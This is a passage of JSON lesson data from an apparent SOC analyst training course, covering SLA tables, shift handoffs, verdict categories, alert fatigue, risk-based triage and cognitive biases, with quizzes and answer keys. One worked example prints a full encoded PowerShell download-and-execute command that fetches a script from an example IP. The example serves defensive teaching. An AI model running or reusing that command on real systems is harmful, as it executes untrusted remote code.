        "body": "Real SLA tables vary by organization, industry, and contract, but they share a common shape. Below is an example modeled on how a mid-sized company's SOC charter might define its commitments. Treat the specific numbers as one reasonable example, not a universal standard.\n\n### Example SLA table (NexaCorp's SOC charter)\n| Severity | Time to Acknowledge | Time to Respond | Time to Resolve (target) |\n|---|---|---|---|\n| Critical | 5 minutes | 15 minutes | 4 hours |\n| High | 15 minutes | 30 minutes | 8 hours |\n| Medium | 30 minutes | 2 hours | 24 hours |\n| Low | 4 hours | 8 hours | 5 business days |\n\n### How severity gets assigned in the first place\nSeverity is usually set by the detection rule itself (a rule matching \"ransomware-like mass file encryption\" is pre-classified Critical; a rule matching \"single failed login\" is pre-classified Low) rather than decided fresh by the analyst each time. This matters because it means the SLA clock often starts ticking before a human has even looked at the alert: the moment the rule fires with a given severity, the corresponding SLA clock begins.\n\n### What happens when severity is reassessed mid-investigation\nSometimes an alert starts as Medium and, during triage, the analyst discovers it is actually part of a larger Critical-severity incident (for example, a \"single failed login\" turns out to be one data point in a password-spray campaign hitting fifty accounts). Well-designed SOC processes allow the analyst to re-classify severity upward mid-investigation, which resets which SLA clock now applies, but re-classifying should always be documented with the reasoning, both for audit purposes and so the next analyst understands why the timeline looks the way it does.\n\n### Why Low-severity SLAs are measured in days, not minutes\nThis is often surprising to beginners: it is not laziness. A Low-severity alert, by definition, represents low estimated risk to the business, spending Critical-level urgency on it would starve genuinely urgent work of analyst attention. The SLA table is fundamentally a resource-allocation tool, directing the SOC's limited attention toward what actually threatens the business most.",
        "keyPoints": [
          "SLA tables tier commitments by severity: Critical gets minutes, Low can reasonably take days",
          "Severity is typically pre-assigned by the detection rule, so the SLA clock can start before a human looks at it",
          "Analysts can and should re-classify severity mid-investigation when evidence reveals broader scope",
          "SLA tables are a resource-allocation tool directing limited analyst attention toward the highest real risk"
        ]
      },
      {
        "pageNumber": 6,
        "title": "Shift Handoff and Follow-the-Sun Coverage",
        "body": "SLA clocks do not pause because a shift ends. A Critical alert that fires ten minutes before a shift change is still bound by the same 15-minute response target, which means handoff quality directly affects whether the SOC meets its commitments.\n\n### What a good handoff includes\n- **Open tickets and their current status** (what has been done, what is still pending\n- **SLA clock status**) how much time remains on any active commitment\n- **Anything unusual from the shift**: a spike in a particular alert type, a known ongoing investigation, a heads-up about a planned change elsewhere in the business (a maintenance window, a new employee's first day) that might explain unusual-looking activity\n- **Explicit ownership**, who is now responsible for each open item, so nothing falls into a gap between two analysts who each assume the other has it\n\n### The \"gap between shifts\" failure mode\nThe single most dangerous failure in shift-based SOCs is an alert that both outgoing and incoming analysts believe belongs to the other person. This is why disciplined handoffs use explicit, written ownership transfer: a verbal \"I think it's fine\" in a hallway is not a handoff, and tickets should never be left in an ambiguous state at shift change.\n\n### Follow-the-sun in practice\nRecall from the previous lesson that follow-the-sun staffing distributes teams across time zones so each analyst works during their local daytime. In this model, a handoff is not just a shift change within one team. It is often a handoff between entirely different regional teams, sometimes at different organizations if an MSSP covers part of the coverage window. This raises the bar on documentation even further, since the incoming team may have no informal shared context at all, only what is written down.\n\n### Why this connects back to escalation\nNotice the throughline: a good shift handoff is structurally the same skill as a good escalation package from page 2, context, timeline, actions taken, and a clear next step. Analysts who build the escalation habit early find shift handoffs come naturally, because it is the same discipline applied at a different transition point.",
        "keyPoints": [
          "SLA clocks do not pause at shift change. Handoff quality directly affects SLA compliance",
          "A good handoff includes open ticket status, remaining SLA time, unusual context, and explicit ownership",
          "The most dangerous SOC failure mode is an alert both shifts assume belongs to the other person",
          "Follow-the-sun handoffs cross regional or organizational boundaries, raising the bar on written documentation"
        ]
      },
      {
        "pageNumber": 7,
        "title": "Where the Tier Model Breaks: Common Pitfalls",
        "body": "Understanding the tier model in theory is different from seeing where it fails in practice. Recognizing these pitfalls now will help you avoid them and recognize them in a team you join.\n\n### Alert fatigue and rubber-stamp closures\nWhen alert volume overwhelms Tier 1 capacity, analysts under pressure to keep the queue moving can start closing alerts as \"benign\" without genuinely investigating: a pattern sometimes called rubber-stamping. This is dangerous precisely because it looks identical to correct triage in the ticketing system: a closed ticket with a verdict, indistinguishable from a properly investigated one unless someone audits the reasoning.\n\n### Escalating without context\nThe opposite failure from page 2's \"weak escalation\" example: a T1 analyst who escalates everything uncertain without doing any of the basic legwork (checking the process tree, confirming the user's normal behavior) defeats the purpose of having a tiered model at all. T2 becomes a second T1 queue instead of a depth specialist, and the whole SOC loses throughput.\n\n### Skipping documentation under time pressure\nAn analyst racing an SLA clock may take the correct triage action but fail to write down why, closing the ticket with a one-word verdict and no reasoning. This erodes the \"institutional memory\" benefit of documentation described in the earlier lesson, and it makes metrics like escalation accuracy impossible to audit later.\n\n### Tier 1 burnout\nBecause T1 absorbs the highest alert volume with the least authority to resolve things independently, it is also the role most vulnerable to burnout. Particularly in SOCs with poor detection engineering, where a large share of alerts are low-quality noise. SOC managers who ignore this eventually see it show up as increased false-negative risk: exhausted analysts miss real threats hidden among the noise.\n\n### Over-escalation from anxious new analysts\nA newer failure pattern worth naming honestly: a new T1 analyst, unsure of their own judgment, may over-escalate out of caution rather than genuine uncertainty. This is a normal early-career phase, not a character flaw: the mental models taught in the next lesson exist specifically to build the confidence and structure needed to triage independently.",
        "keyPoints": [
          "Alert fatigue can produce rubber-stamp closures that look identical to genuine triage in the ticket system",
          "Escalating without doing basic legwork turns Tier 2 into a second Tier 1 queue and destroys the tier model's purpose",
          "Skipping documentation under SLA time pressure erodes institutional memory and breaks later audits",
          "Tier 1 burnout from high alert volume with low resolution authority is a leading cause of missed real threats"
        ]
      },
      {
        "pageNumber": 8,
        "title": "Applying the Model: A Scenario Walkthrough",
        "body": "Let's apply everything from this lesson to one scenario, tracking the tier model, escalation, and SLA clock together.\n\n### The scenario\nAt 09:42, NexaCorp's SIEM generates a **High**-severity alert: a service account normally used only for automated backups has authenticated interactively from a workstation for the first time in six months of logged history. Per the SLA table from page 5, High severity carries a 15-minute Time to Respond target and an 8-hour Time to Resolve target.\n\n### Tier 1 response (09:44. Within the 15-minute window)\nThe on-shift T1 analyst, Priya, acknowledges the alert at 09:44 (well inside the 5-minute acknowledge target). She checks the account's normal behavior pattern: it has never logged in interactively before, only ever running scheduled backup jobs from one specific server. She checks the workstation it logged in from. It belongs to an IT contractor whose access was supposed to have been offboarded two weeks ago per an HR ticket she can see referenced in the identity system's notes.\n\n### Tier 1 decision: escalate with full context (09:53)\nThis is squarely outside T1's authority to resolve alone, a possibly-compromised service account tied to an offboarding failure touches both security and HR/compliance concerns. Priya builds a strong escalation package (per page 2's model): the alert, the account's historical baseline, the contractor workstation detail, the referenced HR offboarding ticket number, and her recommendation to force a credential reset and lock the account pending T2 review. She escalates at 09:53-11 minutes after acknowledgment, still within the 15-minute Time to Respond target.\n\n### Tier 2 takes over (09:55)\nT2 accepts the escalation, reviews Priya's timeline, and, because the context was complete, moves straight to verifying the offboarding gap with HR and IT rather than re-doing any of Priya's investigative work. The account is disabled by 10:20, comfortably inside the 8-hour Time to Resolve target.\n\n### What made this work\nEvery element from this lesson appeared: clear tier boundaries respected, an SLA clock tracked and met, and an escalation package good enough that T2 lost zero time re-investigating. This is what the tier model looks like when it functions as designed.",
        "keyPoints": [
          "Tracking the SLA clock explicitly (acknowledge, respond, resolve) shows whether a real investigation is on pace",
          "A well-built escalation lets Tier 2 act immediately instead of re-investigating from scratch",
          "Recognizing when something is outside your tier's authority is itself a correct, professional triage decision",
          "The tier model succeeds when boundaries, documentation, and SLA awareness all operate together, not in isolation"
        ]
      }
    ],
    "quiz": [
      {
        "question": "What primarily distinguishes a Tier 2 analyst from a Tier 1 analyst?",
        "options": [
          {
            "label": "Tier 2 has broader containment authority and performs deeper, multi-source investigation",
            "value": "b"
          },
          {
            "label": "Tier 2 analysts are scheduled to work exclusively during business hours while Tier 1 always covers the overnight and weekend shifts",
            "value": "a"
          },
          {
            "label": "Tier 1 analysts are only permitted to use the SIEM while Tier 2 analysts are only permitted to use the EDR console",
            "value": "c"
          },
          {
            "label": "Tier 2 is simply a Tier 1 analyst who has worked more overtime hours",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Tiers differ by scope of authority (what actions can be taken unilaterally) and investigation depth (how many sources and how much time a case justifies), not by shift schedule, which tool they use, or hours worked. Tier 1 and Tier 2 both use the SIEM and EDR as needed."
      },
      {
        "question": "An escalation ticket reads only: 'Weird PowerShell on a finance laptop, please check.' What is the main problem with this escalation, based on this lesson?",
        "options": [
          {
            "label": "It should have been sent to Tier 3 instead of Tier 2",
            "value": "a"
          },
          {
            "label": "It violates the SLA table because it does not mention severity",
            "value": "b"
          },
          {
            "label": "It forces the receiving analyst to redo the investigation from scratch instead of acting immediately",
            "value": "c"
          },
          {
            "label": "PowerShell alerts should never be escalated to Tier 2 under any circumstances, regardless of what they contain",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "A weak escalation lacking reasoning, timeline, and prior context forces the receiving analyst to reconstruct everything themselves, wasting the time a good escalation package would save. Severity is normally set by the detection rule rather than stated by the escalating analyst, and routing to Tier 3 versus Tier 2 depends on complexity, not phrasing quality."
      },
      {
        "question": "A SOC's Critical-severity SLA promises a 15-minute response at any hour, but the SOC only staffs analysts during business hours. What does this lesson say about that situation?",
        "options": [
          {
            "label": "An SLA the SOC cannot actually staff for creates a false sense of security and is worse than no SLA at all",
            "value": "d"
          },
          {
            "label": "This is acceptable as long as Critical alerts are rare",
            "value": "a"
          },
          {
            "label": "The SLA should be met using only automated SOAR playbooks with no human involved",
            "value": "b"
          },
          {
            "label": "SLA compliance is only ever measured as a monthly average, so a handful of missed after-hours incidents do not really matter",
            "value": "c"
          }
        ],
        "answer": "d",
        "explanation": "The lesson states directly that an SLA the SOC cannot realistically staff for is worse than no SLA, because it gives the business false confidence in a commitment that will not be met exactly when it matters most, during an off-hours Critical incident."
      },
      {
        "question": "Two SOCs are compared: SOC A detects compromises within minutes (low MTTD) but takes six hours to contain them (high MTTR). SOC B takes two days to detect compromises (high MTTD) but contains them within ten minutes of detection (low MTTR). What does this lesson say about interpreting these two metrics?",
        "options": [
          {
            "label": "SOC A is automatically better because MTTD matters more than MTTR",
            "value": "a"
          },
          {
            "label": "Neither metric alone tells you which SOC limits attacker damage better: the full compromise-to-containment window matters",
            "value": "b"
          },
          {
            "label": "SOC B is automatically better because a fast MTTR fully compensates for a slow MTTD",
            "value": "c"
          },
          {
            "label": "MTTD and MTTR cannot be meaningfully compared across different organizations or SOCs under any circumstances at all",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "The lesson explicitly warns that MTTD and MTTR must be read together: SOC A has a long undetected-to-contained window driven by slow response, while SOC B has a long window driven by slow detection. Judging by either metric alone hides which SOC actually limits real-world attacker dwell time and damage better."
      },
      {
        "question": "A Medium-severity alert is being investigated by a Tier 1 analyst when they discover it is actually one of fifty near-identical failed-login attempts across the organization, consistent with a password-spray campaign. What should the analyst do, according to this lesson?",
        "options": [
          {
            "label": "Ignore the new evidence and leave the alert at Medium severity, since the detection rule already made that call and it cannot be changed",
            "value": "a"
          },
          {
            "label": "Close the ticket immediately since fifty alerts are too many for one analyst to handle",
            "value": "b"
          },
          {
            "label": "Wait until the next shift handoff before taking any further action",
            "value": "c"
          },
          {
            "label": "Re-classify the severity upward with documented reasoning, since the actual scope is now understood to be broader",
            "value": "d"
          }
        ],
        "answer": "d",
        "explanation": "The lesson explains that severity can and should be re-classified mid-investigation when evidence reveals broader scope than the original alert suggested, with the reasoning documented for audit purposes. Leaving the severity unchanged, closing the ticket outright, or waiting for a shift handoff would all delay the appropriately urgent response a password-spray campaign warrants."
      }
    ]
  },
  "soc-analyst--mental-models-for-triage": {
    "pages": [
      {
        "pageNumber": 1,
        "video": {
          "src": "/lesson-videos/mental-models-for-triage/mental-models-for-triage.mp4",
          "caption": "Explainer, Mental Models for Triage · subtitles: English · עברית · Español (CC menu)",
          "tracks": [
            { "srclang": "en", "label": "English", "src": "/lesson-videos/mental-models-for-triage/en.vtt", "default": true },
            { "srclang": "he", "label": "עברית", "src": "/lesson-videos/mental-models-for-triage/he.vtt" },
            { "srclang": "es", "label": "Español", "src": "/lesson-videos/mental-models-for-triage/es.vtt" }
          ]
        },
        "title": "Why Triage Needs a Framework",
        "body": "A well-instrumented enterprise SIEM (Security Information and Event Management platform) can generate thousands of alerts per day. If a Tier 1 analyst approached every single one as a brand-new mystery, reasoning from first principles each time, the SOC would grind to a halt within hours. This lesson teaches the structured way of thinking that lets an experienced analyst triage an unfamiliar alert in minutes instead of hours, not by working faster, but by working with a repeatable framework instead of raw intuition.\n\n### What \"triage\" borrows from its original meaning\nThe word triage comes from emergency medicine: when many patients arrive at once, a nurse or doctor makes a fast initial sort, who needs immediate attention, who can wait, who is already stable. Nobody expects that first sort to be a full diagnosis; it is a fast, structured judgment call made with incomplete information, designed to direct limited attention where it matters most. SOC triage works the same way: a fast initial verdict, not a complete investigation.\n\n### The three ingredients of good triage thinking\nEvery mental model in this lesson supports one of three goals:\n1. **Classify accurately**, using a consistent vocabulary (true positive, false positive, benign true positive) instead of a vague gut feeling\n2. **Resist fatigue**, recognizing how repetition degrades judgment, and building habits that counteract it\n3. **Prioritize by risk, not just by alert type**, understanding that the same alert can mean very different things depending on context\n\n### Why this lesson comes before the technical EDR lessons\nIt would be possible to teach you to read an EDR (Endpoint Detection and Response) alert's fields first and the thinking behind triage second. This path deliberately does the opposite, because the fields only matter in service of a decision, and without a decision-making framework, a beginner reading a real alert's dozens of fields has no way to know which ones matter for the verdict they are trying to reach. Frameworks first, then technical fluency, is the sequencing this entire path follows.",
        "keyPoints": [
          "Alert volume makes case-by-case first-principles reasoning impossible. Triage needs a repeatable framework",
          "Triage borrows from emergency medicine: a fast initial sort with incomplete information, not a full diagnosis",
          "Good triage thinking serves three goals: accurate classification, fatigue resistance, and risk-based prioritization",
          "Decision frameworks come before technical field-reading skill because fields only matter in service of a verdict"
        ]
      },
      {
        "pageNumber": 2,
        "title": "The Verdict Taxonomy",
        "body": "Every alert an analyst closes should map to one of a small number of precise verdict categories. Using this vocabulary consistently (rather than informal language like \"looked fine\") is what makes metrics like false positive rate (introduced in the previous lesson) actually measurable.\n\n### True Positive (TP)\nThe detection correctly identified genuinely malicious or policy-violating activity. Example: an EDR alert correctly flags a process that really was ransomware attempting to encrypt files.\n\n### False Positive (FP)\nThe detection rule fired, but the underlying activity was not malicious at all, the rule itself misfired or was poorly tuned. Example: a detection rule intended to catch credential-dumping tools fires on a legitimate backup agent that happens to use a similar API call pattern.\n\n### Benign True Positive (BTP)\nThis is the category beginners most often get wrong, so it deserves careful attention. A BTP means the detection rule worked exactly as designed and correctly identified the *pattern* it was built to find, but the specific instance turns out to be legitimate, authorized activity, not an attack. Example: a rule correctly detects PsExec (a legitimate Windows Sysinternals remote-execution tool) being used to run a command on a remote server (and it really was PsExec, used exactly the way the rule describes) but it was the IT team running an authorized patch deployment, not an attacker. The rule did not misfire (that would make it a false positive); it correctly identified a real instance of a pattern that happens to be dual-use.\n\n### Why the FP vs. BTP distinction matters operationally\nIf your SOC only tracks \"false positive rate\" without separating out BTPs, you will systematically under-tune detection rules that are actually working correctly but need better context (such as an allow-list for authorized IT maintenance windows) rather than rules that are fundamentally broken and need rewriting. Conflating the two categories misdirects detection engineering effort.\n\n### Undetermined / Indeterminate\nOccasionally, available evidence genuinely cannot support a confident verdict either way. This should be rare and time-boxed, not a default escape hatch for a rushed analyst: an alert marked \"undetermined\" without a documented reason for why more evidence could not be obtained is itself a quality problem.",
        "keyPoints": [
          "True Positive: the detection correctly caught genuinely malicious activity",
          "False Positive: the rule itself misfired on activity that does not match the intended pattern at all",
          "Benign True Positive: the rule correctly matched its pattern, but this specific instance was legitimate, a distinct category from False Positive",
          "Conflating False Positive and Benign True Positive misdirects detection engineering toward the wrong fix"
        ]
      },
      {
        "pageNumber": 3,
        "title": "Alert Fatigue and the Cost of Crying Wolf",
        "body": "Every alert-generating system faces a fundamental tradeoff described by **signal detection theory**: a 2x2 matrix of true positives, false positives, false negatives (a real threat the system missed entirely), and true negatives (correctly staying silent on benign activity). Tuning a detection rule to catch more true positives almost always increases false positives too, and tuning to reduce false positives risks missing real threats (false negatives). No detection system escapes this tradeoff entirely.\n\n### The signal detection matrix\n| | Actually malicious | Actually benign |\n|---|---|---|\n| **Alert fired** | True Positive | False Positive |\n| **No alert fired** | False Negative | True Negative |\n\n### The boy who cried wolf, applied to a SOC\nIn the fable, repeated false alarms eventually caused real danger to be ignored. The exact same dynamic occurs in a SOC: when a detection rule generates a high proportion of false positives, analysts, consciously or not, begin treating every alert from that rule with less scrutiny. This is **alert fatigue**, and its danger is that it degrades judgment silently; an analyst experiencing alert fatigue does not feel less careful, they simply are, because attention is a finite resource that cannot sustain full scrutiny across thousands of near-identical low-value alerts.\n\n### Normalization of deviance\nA related and more insidious pattern: when a genuinely anomalous condition (say, a service account logging in interactively, from page 8 of the previous lesson) occurs repeatedly without consequence (perhaps because it was investigated once, found benign, and never revisited) analysts can start treating it as \"just how things are\" rather than re-evaluating it each time. This concept, originally described in organizational safety research, explains how a SOC can slowly drift toward accepting risk it would never have accepted on day one.\n\n### Why this matters for the frameworks that follow\nThe remaining pages in this lesson exist specifically to counteract alert fatigue and normalization of deviance, not by asking analysts to simply \"try harder\" (attention does not respond to willpower alone), but by giving them a structured checklist that does not depend on subjective freshness of focus.",
        "keyPoints": [
          "Signal detection theory's 2x2 matrix (true/false positive, true/false negative) explains the detection tuning tradeoff",
          "Alert fatigue degrades judgment silently: analysts do not feel less careful even as scrutiny actually drops",
          "Normalization of deviance is when a recurring anomaly gets accepted as routine without being re-evaluated",
          "Structured checklists counteract fatigue better than asking analysts to simply concentrate harder"
        ]
      },
      {
        "pageNumber": 4,
        "title": "Asking the Right Questions",
        "body": "Rather than reacting to what an alert *says*, a disciplined analyst interrogates what it *means*. Journalism's classic five questions (who, what, when, where, how (a sixth, why, is often added)) translate directly into SOC triage.\n\n### The five questions applied to an alert\n- **Who**, which user account or service account is involved? Is this their normal behavior?\n- **What**: what exactly happened, in technical terms? A process executed, a file was modified, a login occurred. Be specific, not vague.\n- **When**. Does the timing fit a pattern (business hours vs. 3 a.m.) or a known event (a patch deployment window, an onboarding date)?\n- **Where**, which host, which network segment, which geographic location? Does the \"where\" match the \"who\"?\n- **How**. What mechanism produced this activity? A double-clicked attachment, a scheduled task, an interactive remote session?\n\n### The \"so what?\" test\nAfter answering the five questions, ask one more: **so what?**, if this activity is exactly as it appears, does it actually matter to the business? A perfectly legitimate-looking login from an unexpected country might still matter enormously if the account belongs to a finance executive with wire-transfer authority, and might matter much less for a shared read-only reporting account. The \"so what?\" test is what connects an alert's technical facts to real business risk, and it is the single question most beginners skip because it requires knowing something about the organization beyond the alert itself.\n\n### A worked mini-example\nAn alert shows: **Who**, a marketing coordinator's account. **What**: a login to the finance department's payroll system. **When**: 11 p.m. on a Saturday. **Where**, from a residential IP address in a country the company has no offices in. **How**: standard username/password authentication, no MFA challenge recorded. Even without any EDR or malware signature involved, the five questions alone surface enough anomaly (wrong person, wrong system, wrong time, wrong location) to justify serious investigation. This is the \"so what?\" test answering itself once the facts are laid out clearly.\n\n### Why this precedes the checklist on the next page\nThe five questions are the raw material; the checklist on the next page is the structure that ensures you ask them every time, even under time pressure.",
        "keyPoints": [
          "The five questions (who, what, when, where, how) turn a vague alert into specific, checkable facts",
          "The 'so what?' test connects technical facts to actual business risk, which requires organizational context",
          "Anomalies across multiple dimensions (wrong person, system, time, and location at once) compound suspicion",
          "Asking these questions explicitly, every time, is what a structured checklist is designed to enforce"
        ]
      },
      {
        "pageNumber": 5,
        "title": "Risk-Based Thinking: Likelihood x Impact",
        "body": "Not every suspicious-looking alert deserves equal urgency, and not every urgent alert looks dramatic on the surface. Risk-based thinking combines two independent dimensions (how likely this is to be real, and how bad it would be if it is) rather than reacting to surface-level alarm alone.\n\n### The two dimensions\n- **Likelihood**. Based on the evidence gathered so far (via the five questions), how probable is it that this represents genuine malicious activity rather than benign or expected behavior?\n- **Impact**, if this activity is malicious, how much damage could it cause given what it touches? A compromised low-privilege account on an isolated test server has low potential impact; a compromised domain administrator account has extremely high potential impact.\n\n### A simple prioritization grid\n| | Low impact | High impact |\n|---|---|---|\n| **Low likelihood** | Deprioritize, document, close if evidence supports | Monitor closely; do not dismiss outright |\n| **High likelihood** | Investigate promptly | Immediate escalation and urgent investigation |\n\n### Why asset and identity context change everything\nThis is where the \"who\" and \"where\" from the five questions feed directly into impact assessment. The exact same technical alert (say, a suspicious PowerShell execution) carries very different impact depending on whether it occurred on a shared kiosk workstation with no sensitive data, or on a domain controller (a server that manages authentication for the entire network). A T1 analyst who evaluates every alert purely on its technical signature, ignoring what asset or identity is involved, will systematically under-prioritize attacks on the organization's most sensitive systems.\n\n### Likelihood is not static. It updates as you investigate\nA critical habit: likelihood should be treated as a working estimate that updates as new evidence arrives, not a single guess made once and locked in. An alert that looked like low-likelihood noise at first glance can become high-likelihood the moment you discover, for example, that the same source IP touched three other accounts in the last hour. Risk-based thinking is therefore not a one-time calculation but a running assessment updated throughout the \"Investigation\" stage of the alert pipeline from the earlier lesson.",
        "codeExample": "flowchart LR\n    A[Gather evidence: who/what/when/where/how] --> B{Estimate likelihood}\n    B -->|New evidence found| A\n    B --> C{Estimate impact given asset/identity}\n    C --> D[Combine into priority: likelihood x impact]\n    D --> E[Route: deprioritize, monitor, investigate, or escalate urgently]",
        "keyPoints": [
          "Risk-based thinking combines likelihood (how probable is this real) with impact (how bad if it is)",
          "The same technical alert carries different impact depending on the asset or identity involved",
          "Ignoring asset/identity context systematically under-prioritizes attacks on the most sensitive systems",
          "Likelihood is a running estimate that should update as new evidence emerges during investigation"
        ]
      },
      {
        "pageNumber": 6,
        "title": "A Structured Triage Checklist",
        "body": "The previous three pages gave you the raw components: the verdict taxonomy, the five questions, and likelihood x impact thinking. This page assembles them into a single repeatable checklist: the kind of structure that keeps working even when an analyst is tired, at 3 a.m., or facing their fortieth alert of the shift.\n\n### The checklist\n1. **Context**: before forming any opinion, gather the who/what/when/where/how. Do not skip straight to a verdict.\n2. **Correlate**, check whether related activity exists: other alerts on the same host or user, recent tickets, known maintenance windows or authorized activity.\n3. **Confirm**: apply the verdict taxonomy explicitly. Is this a True Positive, False Positive, Benign True Positive, or genuinely Undetermined? State which, and why, in writing.\n4. **Calculate**, apply likelihood x impact thinking given the asset and identity involved. This determines urgency, not just correctness of verdict.\n5. **Communicate**, document the verdict and reasoning (per the \"closure and documentation\" stage of the alert pipeline), and if escalating, build the strong escalation package described in the previous lesson.\n\n### Why a checklist beats intuition under fatigue\nIntuition is not unreliable because analysts are bad at their jobs. It is unreliable because attention and pattern-recognition both degrade under repetition and fatigue, as covered on page 3. A checklist does not require fresh mental energy to apply consistently; it substitutes a fixed procedure for a variable mental state. This is precisely why checklists are standard practice in other high-consequence, high-repetition fields like aviation and medicine, and it is why experienced SOC analysts often report relying on their checklist habits *more*, not less, as they gain experience, not because their judgment has gotten worse, but because they have learned how unreliable unaided judgment becomes under real-world volume.\n\n### Adapting the checklist without abandoning it\nExperienced analysts often internalize these five steps so thoroughly that they no longer consciously walk through them one at a time, but the underlying steps are still all happening. A checklist earns the right to become implicit only after it has been applied explicitly, many times, on real alerts.",
        "keyPoints": [
          "The five-step checklist is Context, Correlate, Confirm, Calculate, Communicate",
          "Checklists outperform unaided intuition specifically because attention degrades under fatigue and repetition",
          "Confirm requires explicitly naming the verdict category, not just forming an informal impression",
          "Experienced analysts internalize the checklist but the underlying steps still happen, just implicitly"
        ]
      },
      {
        "pageNumber": 7,
        "title": "Cognitive Biases That Trip Up Analysts",
        "body": "Even a well-designed checklist can be undermined by predictable patterns in human reasoning. Naming these biases explicitly is the first step to noticing when they are steering a decision.\n\n### Confirmation bias\nThe tendency to notice and favor evidence that supports a belief you already hold, while discounting evidence against it. In practice: an analyst who decides early that \"this is probably nothing\" may subconsciously stop looking as hard for evidence that it is, in fact, something, undermining the \"Context\" and \"Correlate\" steps of the checklist before they are even complete.\n\n### Automation bias\nThe tendency to over-trust an automated system's output simply because it is automated, for example, assuming a detection rule's assigned severity or a threat intelligence feed's \"known good\" verdict on an indicator must be correct, without independently verifying it. Automation should accelerate an analyst's work, not replace their judgment entirely.\n\n### Anchoring\nThe tendency to rely too heavily on the first piece of information encountered. If the alert's title says \"Likely False Positive. Known Software Update,\" an analyst may anchor on that framing and evaluate everything afterward through that lens, even if the actual evidence (the who/what/when/where/how) tells a different story.\n\n### Normalization of deviance (revisited)\nIntroduced on page 3 as an organizational pattern, it is also an individual cognitive bias: once an analyst has personally seen a given anomaly investigated and dismissed as benign several times, their own threshold for re-investigating it drops, sometimes below the threshold the checklist actually calls for.\n\n### Why naming a bias is not the same as being immune to it\nIt would be a mistake to think that simply knowing these terms makes an analyst immune to them. Psychological research on bias generally finds that awareness helps but does not eliminate the effect. This is exactly why the checklist from the previous page matters more than good intentions alone: a structured, written process that requires explicit statement of reasoning (the \"Confirm\" step) creates a natural checkpoint where an analyst is more likely to notice their own anchoring or confirmation bias than if they were reasoning silently and informally.",
        "keyPoints": [
          "Confirmation bias causes analysts to stop looking once they favor an early conclusion",
          "Automation bias means over-trusting a tool's verdict (severity, threat intel) without independent verification",
          "Anchoring means an alert's initial framing or title can distort the entire subsequent evaluation",
          "Awareness of a bias reduces but does not eliminate it: a written checklist provides a structural safeguard"
        ]
      },
      {
        "pageNumber": 8,
        "title": "Worked Example: Triaging a Suspicious PowerShell Alert",
        "body": "Let's apply the full checklist to one alert, end to end.\n\n### The raw alert\nAn EDR detection fires on a marketing department workstation: powershell.exe executed with the command line shown below, spawned as a child of outlook.exe (the Microsoft Outlook email client).\n\n### Step 1, Context\n**Who**: a marketing specialist, no prior security incidents. **What**: PowerShell launched by Outlook, using -EncodedCommand (a flag that accepts a base64-encoded script, commonly used both by legitimate automation and by attackers to obscure a script's actual content from casual inspection). **When**: 10:41 a.m. on a weekday: unremarkable timing. **Where**: a standard marketing workstation, no elevated privileges. **How**: the user reports opening an email with a \"shipping label\" attachment minutes earlier.\n\n### Step 2. Correlate\nNo other alerts on this host in the past 90 days. No record of any legitimate business process that has Outlook launch PowerShell: the marketing team has no known automation that behaves this way. A quick check shows the decoded command downloads content from an external address.\n\n### Step 3. Confirm\nOutlook spawning PowerShell with an encoded, obfuscated command line immediately following a user opening an email attachment is not a rule misfire (ruling out False Positive) and does not match any known authorized pattern (ruling out Benign True Positive). This is a **True Positive**.\n\n### Step 4, Calculate\nLikelihood: high, given the clear causal chain from attachment to encoded PowerShell. Impact: moderate, a marketing workstation without elevated privileges, but any foothold can be used for further lateral movement, so impact is not negligible.\n\n### Step 5. Communicate\nThe analyst documents the full chain above, states the verdict explicitly as True Positive, and, per the previous lesson, builds a strong escalation package recommending host isolation, since T1 authority does not extend to containment for a confirmed True Positive at this severity.",
        "codeExample": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBwAC4AcABzADEAJwApAA==\n# Parent process: OUTLOOK.EXE  |  Decodes to: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/p.ps1')",
        "keyPoints": [
          "The five-step checklist (Context, Correlate, Confirm, Calculate, Communicate) applies cleanly even under time pressure",
          "Outlook spawning encoded PowerShell right after an attachment opens is a classic malicious causal chain, not noise",
          "Stating the verdict explicitly as a named category (True Positive) is what makes the ticket auditable later",
          "Even moderate-impact hosts warrant escalation when likelihood is high, since a foothold enables further lateral movement"
        ]
      }
    ],
    "quiz": [
      {
        "question": "A detection rule designed to catch credential-dumping tools fires on a legitimate backup agent that happens to use a similar API call pattern: the backup agent is not malicious and does not match the intended attack pattern at all. What verdict category does this describe?",
        "options": [
          {
            "label": "False Positive, because the rule matched activity that does not actually fit the pattern it was built to detect",
            "value": "b"
          },
          {
            "label": "Benign True Positive, because the underlying activity turned out to be legitimate and fully authorized business activity",
            "value": "a"
          },
          {
            "label": "True Positive, because a rule did fire as expected",
            "value": "c"
          },
          {
            "label": "Undetermined, since more evidence would be needed to decide",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "This is a False Positive because the rule itself misfired on activity that does not match its intended pattern at all. A Benign True Positive would instead describe a case where the rule correctly identified its intended pattern (for example, real PsExec usage) but the specific instance was authorized: a distinct scenario from a rule matching something it was never designed to catch."
      },
      {
        "question": "A detection rule for a known dual-use remote administration tool has a very high false-positive rate according to the SOC's dashboard. On closer review, most of these 'false positives' are actually cases where the rule correctly detected real uses of the tool, but by the authorized IT team during scheduled maintenance. What is the risk of not separating these into a Benign True Positive category?",
        "options": [
          {
            "label": "There is no risk at all: False Positive and Benign True Positive are simply two completely interchangeable names describing the exact same underlying situation",
            "value": "a"
          },
          {
            "label": "The rule would need to be immediately escalated to Tier 3 regardless of classification",
            "value": "b"
          },
          {
            "label": "The SOC may mistakenly rewrite or disable a correctly functioning detection rule instead of adding an allow-list for authorized maintenance activity",
            "value": "c"
          },
          {
            "label": "SLA metrics become impossible to calculate if any Benign True Positives exist",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "The lesson explains that conflating False Positive and Benign True Positive misdirects detection engineering effort: a rule generating true detections of a real but authorized pattern needs contextual tuning (like an allow-list), not a rewrite, since the underlying detection logic is actually working correctly."
      },
      {
